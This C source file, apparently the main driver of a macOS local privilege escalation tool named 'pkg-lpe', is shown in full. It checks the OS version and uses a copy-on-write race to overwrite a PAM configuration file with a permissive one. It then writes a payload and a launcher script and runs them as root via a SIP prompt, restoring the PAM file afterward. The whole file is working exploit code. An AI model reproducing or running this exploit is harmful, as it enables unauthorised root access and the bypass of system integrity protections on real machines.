//
//  main.c
//  pkg-lpe
//
//  Created by Michael on 23/05/2023.
//

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/types.h>
#include <sys/sysctl.h>

#include "unpack.h"
#include "pam.h"
#include "vm_unaligned_copy_switch_race.h"
#include "logging.h"
#include "payload.h"

struct os_version {
    int major;
    int minor;
    int patch;
};

#define FULL         0
#define SIP_ONLY     1
#define UNSUPPORTED  2

void CheckCompatibility(uint32_t* strategy)
{
    // We can run to the end IF:
    //  - we are on 13.0.1 or below
    //  - we are on <13.6, only if we're root
    char                 os_version[20]     = {0};
    size_t               os_version_length  = sizeof(os_version);
    struct os_version    ver                = {0};
    int                  res                = 0;
    
    if ( NULL != strategy )
    {
        res = sysctlbyname ( "kern.osproductversion", os_version, &os_version_length, NULL, 0 );
        if ( 0 == res )
        {
            sscanf( os_version, "%d.%d.%d", &ver.major, &ver.minor, &ver.patch );
            
            if( geteuid() )
            {
                if ( ver.major > 13 || ( ver.major == 13 && ver.minor >= 1 ) )
                {
                    ERROR( "no LPE for >=13.1.0, unsupported OS\n" );
                    // not supported
                    *strategy = UNSUPPORTED;
                }
                else
                {
                    SUCCESS( "Have LPE for %d.%d.%d\n", ver.major, ver.minor, ver.patch );
                    *strategy = FULL;
                    // no idea how far back the lpe works
                }
            }
            else
            {
                if( ver.major < 13 || ( ver.major == 13 && ver.minor < 5 ) )
                {
                    SUCCESS( "already root, have SIP bug\n" );
                    *strategy = SIP_ONLY;
                }
                else
                {
                    // not supported
                    ERROR( "no LPE for >=13.1.0, unsupported OS\n" );
                    *strategy = UNSUPPORTED;
                }
            }
        }
        else
        {
            ERROR( "sysctlbyname() returned %d error (%d): %s", res, errno, strerror(errno) );
            *strategy = UNSUPPORTED;
        }
    }
    else
    {
        ERROR( "bad argument strategy (%p)\n", strategy );
    }
}

//
//      - Unpack bundled PKG
//      - Write out a padded replacement pam file with COW bug
//      - Write out a launcher (calls installer) and payload (final stage)
//      - Use root perms to execute launcher
//
int main(int argc, const char * argv[]) {
    char      launcherBuffer[BUFSIZ]    = {0};
    char*     originalFile              = NULL;
    size_t    paddingLength             = 0;
    uint32_t  strategy                  = UNSUPPORTED;

    CheckCompatibility( &strategy );

    if( UNSUPPORTED == strategy )
    {
        ERROR("incompatible OS\n");
        return 1;
    }
    
    unlink( PAYLOAD_STATUS_PATH );

    if ( Unpack( argv[0] ) )
    {
        ERROR("Failed to unpack bundled package\n");
        return 3;
    }

    if( FULL == strategy )
    {
        if(  ReadPamFile(&originalFile) )
        {
            ERROR("failed to read pam file for backup\n");
            return 2;
        }

        if( PaddingLength(&paddingLength) )
        {
            ERROR("failed to calculate padding\n");
            return 4;
        }
        
        SUCCESS("need %ld bytes of padding\n", paddingLength);
        
        if( WriteFile( TEMP_FILE, PERMISSIVE_PAM, paddingLength ) )
        {
            ERROR("Failed to write overwrite file\n");
            return 5;
        }
        
        // We now have a patched file on disk, replace it
        OverwriteFile( OVERWRITE_FILE, TEMP_FILE );
    }

    if( WriteExecutableScript( PAYLOAD_PATH, PAYLOAD, strlen( PAYLOAD ) ) )
    {
        ERROR("Failed to write payload\n");
        return 6;
    }
    
    sprintf( launcherBuffer, LAUNCHER, PAYLOAD_PATH, PACKAGE_OUT_PATH );
    
    if( WriteExecutableScript(LAUNCHER_PATH, launcherBuffer, strlen(launcherBuffer ) ))
    {
        ERROR("Failed to write launcher\n");
        return 7;
    }
    
    LaunchSIPPrompt( );
    
    if( FULL == strategy )
    {
        // Now restore the file
        if( WriteFile( TEMP_FILE, originalFile, strlen( originalFile ) ) )
        {
            ERROR("failed to write original pam to temp\n");
            return 8;
        }

        SUCCESS("Wrote original pam to %s\n", TEMP_FILE);
        
        OverwriteFile (OVERWRITE_FILE, TEMP_FILE );

        unlink( TEMP_FILE );
    }
    return 0;
}
